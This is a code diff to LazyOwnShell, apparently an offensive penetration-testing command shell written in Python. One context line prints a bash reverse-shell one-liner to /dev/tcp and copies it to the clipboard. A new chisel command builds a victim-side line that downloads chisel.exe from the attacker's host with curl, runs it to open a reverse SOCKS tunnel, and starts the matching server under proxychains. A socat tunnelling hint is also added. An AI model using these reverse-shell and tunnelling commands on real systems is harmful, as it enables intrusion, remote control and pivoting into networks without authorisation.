@@ -1411,7 +1411,7 @@ class LazyOwnShell(Cmd):
         print(f"    [+] Try ... bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
         os.system(f"echo \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
         return
-        
+
     def do_conptyshell(self,line):
         """Download ConPtyShell in sessions directory and copy to clipboard the command :D """
         lhost = self.params["lhost"]
@@ -1581,7 +1581,7 @@ class LazyOwnShell(Cmd):
         return
     def do_clean(self, line):
         """delete all from sessions"""
-        os.system("rm sessions/*.ps1 sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* -rf")
+        os.system("rm sessions/*.ps1 sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* -rf")
         print(f"    {GREEN}[*]{YELLOW} cleanned sessions directory. {RESET}")
         return
 
@@ -1608,8 +1608,31 @@ class LazyOwnShell(Cmd):
         if not line:
             print(f"    [?]{YELLOW} you must pass ip:port by argument ex:{GREEN} socat 10.10.10:445  {WHITE} more help: {CYAN} help socat{RESET} ")
             return
+        print(f'    {GREEN}[*] Try... {MAGENTA}socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080{RESET}')
         os.system(f'socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080')
         print(f"    {RED}[*] {YELLOW} Shutdown socat tunnel at sessions in port {RED} 1080 {RESET}")
+        return
+
+    def do_chisel(self, line):
+        """run download_resources command to download and run chisel :D like ./chisel_linux_amd64 server -p 3333 --reverse -v """
+        lhost = self.params["lhost"]
+        if not lhost:
+            print(f"    [?]{YELLOW} you must set lhost ex:{GREEN} set lhost 10.10.10.10 or payload (alias p)  {WHITE} more help: {CYAN} help set{RESET} ")
+            return
+        if not line:
+            print(f"    [?]{YELLOW} you must pass port by argument ex:{GREEN} chisel 3333  {WHITE} more help: {CYAN} help chisel{RESET} ")
+            return
+        if not os.path.exists('sessions/chisel_1.9.1_linux_amd64.gz'):
+            print(f"    {YELLOW}[+] you must run download_resources before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}")
+  
+        print(f'    {GREEN}[*]Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {line} --reverse -v {RESET} and copied .\chisel.exe client -v {lhost}:{line} R:socks to clipboard :D')
+        command = f"curl http://{lhost}/chisel.exe -o chisel.exe ; .\\chisel.exe client -v {lhost}:{line} R:socks"
+        cmdd = f'echo "{command}" | xclip -sel clip'
+        print(f"{MAGENTA}[+] Command to copy: {GREEN}{command}{RESET}")
+        os.system(cmdd)
+        os.system(f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x * && proxychains ./chisel_1.9.1_linux_amd64 server -p {line} --reverse -v")
+        print(f"    {RED}[*] {YELLOW} Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}")
+
         return
 
     def do_msf(self, line):
